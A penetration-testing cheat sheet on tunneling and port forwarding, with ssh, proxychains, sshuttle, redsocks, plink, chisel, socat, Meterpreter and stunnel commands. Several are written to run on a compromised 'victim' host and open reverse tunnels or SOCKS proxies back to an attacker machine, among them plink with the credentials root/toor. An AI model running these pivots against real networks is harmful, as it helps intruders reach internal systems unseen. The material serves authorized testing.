# Tunneling/Port Forwarding Cheat Sheet

This cheat sheet contains known and common techniques for port forwarding and tunneling that we often use during engagements.

It is inspired by (and we believe extends) the following:

- https://book.hacktricks.xyz/tunneling-and-port-forwarding
- https://www.offensive-security.com/metasploit-unleashed/
- https://www.youtube.com/watch?v=JDlt5U52YMA

## Summary

- [SSH Local Port Forwarding](#SSH-Local-Port-Forwarding)
- [SSH Remote Port Forwarding](#SSH-Remote-Port-Forwarding)
- [Proxychains](#Proxychains)
  - [Configure proxychains.conf](#Configure-proxychains.conf)
  - [Dynamic port via ssh](#Dynamic-port-via-ssh)
  - [Execute proxychains](#Execute-proxychains)
- [Sshuttle](#Sshuttle)
- [Redsocks](#Redsocks)
  - [Configure redsocks.conf](#Configure-redsocks.conf)
  - [Configure iptables](#Configure-iptables)
  - [Dynamic ssh port](#Dynamic-ssh-port)
  - [Execute redsocks](#Execute-redsocks)
- [Plink](#Plink)
  - [Plink Port Forwarding](#Plink-Port-Forwarding)
  - [Plink Troubleshootings](#Plink-Troubleshootings)
- [Chisel](#Chisel)
  - [Chisel Tunneling](#Chisel-Tunneling)
  - [Chisel Port Forwarding](#Chisel-Port-Forwarding)
- [Socat](#Socat)
  - [Socat Port Forwarding](#Socat-Port-Forwarding)
- [Metasploit](#Metasploit)
  - [Meterpreter Local Port Forwarding](#Meterpreter-Local-Port-Forwarding)
- [Stunnel](#Stunnel)
  - [Tunnel Plaintext Connections Through TLS](#Tunnel-Plaintext-Connections-Through-TLS)

## SSH Local Port Forwarding

Brings a port from the remote machine to your attacking machine:

```
ssh -N -L [IP_of_Interface(optional)]:[end_port]:[victim_ip]:[victim_port] [victim_user]@[victim_ip]
```

> **Note**: *The above command is run at your attacking machine.*

The `victim_ip` is the IP of the system whose port you want to forward on your attacking host.

The `[IP_of_Interface(optional)]` can be omitted, or set to `0.0.0.0` so as to set a bind port for all interfaces.

The `-N` can be omitted, as it doesn't enable ssh command execution, it's there to be useful when forwarding ports.

**example**: `ssh -N -L 0.0.0.0:9999:192.168.67.132:80 victim@192.168.67.132`

After the above command is run, the remote `httpd` service can be accessed by your local port `9999`.

## SSH Remote Port Forwarding

Brings a port from a machine in the internal victim's network to your attacking machine:

```
ssh -N -R [your_ssh_server_interface]:[your_port]:[victim_ip]:[victim_port_you_want_to_forward] [attackerusername]@[your_ssh_server_ip]
```

The `your_ssh_server_interface:` can be omitted. 

The `-N` can be omitted, as it doesn't enable ssh command execution, it's there to be useful when forwarding ports.

> **Note**: *The above command is run at a compromised machine inside the target network.*

**example**: `ssh -N -R 192.168.67.1:4445:192.168.67.128:445 user@192.168.67.1`

After the above command is run, port `445` of host `192.168.67.128` (which is different from the compromised machine) is forwarded at the ssh server of IP `192.168.67.1`. 

The `victim_ip` can be set to `127.0.0.1`. This means that a local (in relation to where the command is run) port will be forwarded to the target ssh server

For this to work, you need the following configuration at your SSH server (`/etc/ssh/sshd_config`):

`GatewayPorts yes`

## Proxychains 

When you want to forward many target ports in a dynamic manner, using `ssh` you can create such a dynamic tunnel with the `-D` switch. Then, using this tunnel and `proxychains`, you can forward all scans/traffic through this tunnel, which dynamically forward the required port.

### Configure proxychains.conf (attacker's machine)

At the attacker's machine, make sure `proxychains` is installed. The default configuration settings are ok (`/etc/proxychains.conf`):

```
#proxy_dns 
socks4 127.0.0.1 9050
```

You can use `socks5`, `http` or `https` protocol. `ICMP` is not supported.

### Dynamic port via ssh 

We create a dynamic application-level port forwarding from the attacking machine to the victim machine, by running the following at the attacker's machine

```
ssh -fND [proxychains.conf_port] [victim_user]@[victim_host]
```

The `-f` requests ssh to run in background just before command execution.

The `-N` can be omitted, as it doesn't enable ssh command execution, it's there to be useful when forwarding ports.

We verify the successful tunnel creation with `ss -lt4pn`, where we should see something like this:
```
LISTEN	0		128		127.0.0.1:9050		0.0.0.0:*		users:(("ssh",pid=31697,fd=5))
```

Then, we can execute supported tools with `proxychains` so as to tunnel them through our ssh tunnel:

```
proxychains [tool] 
```

e.g.:

```
sudo proxychains nmap -sVT 172.16.45.130 -Pn
```

Remember that `proxychains` doesn't support `icmp` and therefore we should use relevant flags in `nmap` and other tools.

## Sshuttle

Set a VPN through ssh:

```
sshuttle -e "command to execute" -r [user]@[ip] [range]
```

Example:

```
sshuttle -e "ssh -i id_rsa" -r root@10.10.10.130 172.168.1.0/24
```
The **-e** uses to connect to the remote server. The default is just ssh. Use this if your ssh client is in a non-standard location or you want to provide extra options to the ssh command <br /> 
The **-r** uses for the remote hostname and optional username and ssh port number.

## Redsocks

Sets a TCP-to-proxy redirector through ssh. 

### Configure redsocks.conf

```
log_debug = on;
log = "stderr";
daemon = off;
local_ip = 0.0.0.0;
```

### Configure iptables

Configure iptables in order to allow communication and redirect the requets:

```
echo 1 > /proc/sys/net/ipv4/ip_forward && iptables -t nat -A OUTPUT -p tcp -d [range] -j REDIRECT --to-ports 12345 && iptables -t nat -A PREROUTING -p tcp -d [range] -j REDIRECT --to-ports 12345
```

Example:

```
echo 1 > /proc/sys/net/ipv4/ip_forward && iptables -t nat -A OUTPUT -p tcp -d 172.168.1.0/24 -j REDIRECT --to-ports 12345 && iptables -t nat -A PREROUTING -p tcp -d 172.168.1.0/24 -j REDIRECT --to-ports 12345
```

### Dynamic ssh port

Set a Dynamic Ssh port on default port 1080 of redsocks:

```
ssh -NfD 1080 [victim user]@[victim ip]
```

### Execute redsocks

```
/usr/sbin/redsocks -c /etc/redsocks.conf
```

## Plink

### Remote Tunnel

```
cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
```

for example, suppose you have gained access at a dual-homed host and using this access, you want to access a port at another host that is not connected to the internet (you can't directly talk to it) but is accessible from the host you have access to:

- `attacker_ip` = 13.13.13.13
- `attacker_port` = 2222 (this is the final port that will accept the remote connection)
- `victim_ip` = 10.10.10.10 (IP of the inaccessible host)
- `victim_port` = 22 (Port of the inaccessible host that you will tunnel outside)

`cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 13.13.13.13:2222:10.10.10.10:22 13.13.13.13`

### Local Tunnel

If you don't want to do an SSH remote port forwarding, but a local one instead:

```
cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:127.0.0.1:[victim_port] [attacker_ip]
```

The above command will forward the local `victim_port` at the host that you have access to, to your `attacker_ip`:`attacker_port`

In the commands above, the `cmd.exe /c echo y |` part can be ommited if you have previously accepted the server SSH certificate.

For the above to work, you need the following configuration at your SSH server:
`GatewayPorts yes`

### Plink Troubleshooting

* Check if architecture of plink and target system are compitable (32 bit & 64 bit).
* Check the version of plink, find newest version [here](https://www.putty.org/)
* Key exchange algorithm troubleshooting: 
	* FATAL ERROR: Couldn't agree a key exchange algorithm (available: curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256).
	* Solution: Try to edit **/etc/ssh/sshd_config** and put the following to the top of the file:
	```
	KexAlgorithms +diffie-hellman-group1-sha1
	Ciphers +aes128-cbc
	```
	Stop ssh from attackers machine:
	```
	systemctl stop ssh
	```
	Regenerate the keys:
	```
	ssh-keygen -A
	```
	Start ssh again:
	```
	systemctl start ssh
	```
	Use again the plink (Victim machine)


## Chisel

### Chisel Tunneling

You need to use the **same version for client and server** of chisel.

Server side (Attacker):

```
chisel server -p 8080 --reverse
```

Client Side (Victim):
```
chisel-x64.exe client [myip]:8080 R:socks 
```

After that use **proxychains** with port 1080 (default).

Aftes version 1.5.0 chisel uses socks5 proxy.

### Chisel Port Forwarding

You need to use the **same version for client and server** of chisel.

Server side (Attacker):

```
chisel server -p 12312 --reverse
```

Client Side (Victim):

```
chisel client [myip]:12312 R:[port]:127.0.0.1:[port]
```

## Socat 

### Socat Port Forwarding

```
socat TCP-LISTEN:[victim_port],fork,reuseaddr TCP:[redirect_ip]:[exposed_port]
```

## Metasploit

### Meterpreter Local Port Forwarding

```
portfwd add –l [local_port] –p [exposed_port] –r [target_host]
```

More info about portfwd [here](https://www.offensive-security.com/metasploit-unleashed/portfwd/)

## Stunnel

### Tunnel Plaintext Connections Through TLS

use this conf at the compromised machine to forward connections from its localhost 80 to remote target over TLS/SSL:

Edit `/etc/stunnel/stunnel.conf`
```
; Sample stunnel configuration file for Unix by Michal Trojnara 1998-2020
; Make sure you keep the default first line, as it contains some special
; chars that are needed
setuid = stunnel
setgid = stunnel

[trivial client]
client     = yes
accept     = 127.0.0.1:80
connect    = www.google.com:443
debug      = 3
PSKsecrets = /etc/stunnel/psk.txt
setuid     = stunnel
setgid     = stunnel
```

Generate a psk: `openssl rand -base64 180 | tr -d '\n' | sed '1s/^/psk:/' > /etc/stunnel/psk.txt`
